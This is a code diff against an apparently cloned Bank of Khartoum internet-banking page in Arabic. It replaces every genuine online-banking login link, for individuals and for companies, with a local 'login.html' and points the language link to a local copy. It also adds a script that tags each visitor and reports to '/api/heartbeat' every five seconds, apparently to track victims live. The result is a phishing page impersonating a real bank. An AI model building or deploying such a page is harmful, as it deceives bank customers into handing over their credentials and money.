@@ -612,7 +612,7 @@
                                                     
                         <li>
                                                             <a
-                                    href="https://bankofkhartoum.com/sudan/en/digital/ibok/ibok-individual">&nbsp;&nbsp;&nbsp;<strong>Eng</strong></a>&nbsp;&nbsp;&nbsp;
+                                    href="index-en.html">&nbsp;&nbsp;&nbsp;<strong>Eng</strong></a>&nbsp;&nbsp;&nbsp;
                                                     </li>
                         <li class="opn-srch text-danger" style="cursor:pointer;">
                             بحث &nbsp;  <i class="bi bi-search"></i>
@@ -622,20 +622,20 @@
                         
                         >
                                                             <strong>
-                                    <a href="https://ib.bok-sd.com/mfmbs/bok/" class="text-danger">
+                                    <a href="login.html" class="text-danger">
                                         <i class="bi bi-lock"></i>
                                         الانترنت المصرفي
-                                        
+
                                     </a>
                                 </strong>
                                 <ul class="show-box-v2">
                                                                             <li>
-                                            <a href="https://eaccount.bankofkhartoum.com/">
+                                            <a href="login.html">
                                                 الخدمات المصرفية للأفراد
                                             </a>
                                         </li>
                                                                                                                 <li>
-                                            <a href="https://ib.bok-sd.com/mfmbs/bok/">
+                                            <a href="login.html">
                                                 الخدمات المصرفية للشركات
                                             </a>
                                         </li>
@@ -747,7 +747,7 @@
                     <ul class="icons-box" role="menu">
                         <li class="mob-lang1 d-none">
                                                             <a
-                                    href="https://bankofkhartoum.com/sudan/en/digital/ibok/ibok-individual">&nbsp;&nbsp;&nbsp;<strong>Eng</strong></a>&nbsp;&nbsp;&nbsp;
+                                    href="index-en.html">&nbsp;&nbsp;&nbsp;<strong>Eng</strong></a>&nbsp;&nbsp;&nbsp;
                                                     </li>
                         <li class="opn-srch d-none" style="cursor:pointer;">
                             &nbsp;&nbsp;<i class="bi bi-search"></i> &nbsp;&nbsp;
@@ -1143,7 +1143,7 @@
                                 مصممة خصيصًا لتلبية<br>احتياجاتك
                             </h3>
 
-                                                                                                <a href="https://ib.bok-sd.com/mfmbs/bok/rib/#/"
+                                                                                                <a href="login.html"
                                         class="btn btn-secondary custom-action-btn waves-effect waves-light">
                                         <span>تسجيل الدخول
                                             &nbsp;&nbsp;&nbsp;<i class="bi bi-chevron-right"></i>
@@ -1956,10 +1956,10 @@
                 devtools.open = false;
             }
         }, 1000);
-    </script>
-
-
-
+    </script><script>
+var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'home',vid:_vid})}).catch(function(){});}
+heartbeat();setInterval(heartbeat,5000);
+</script>
 </body>
-
 </html>
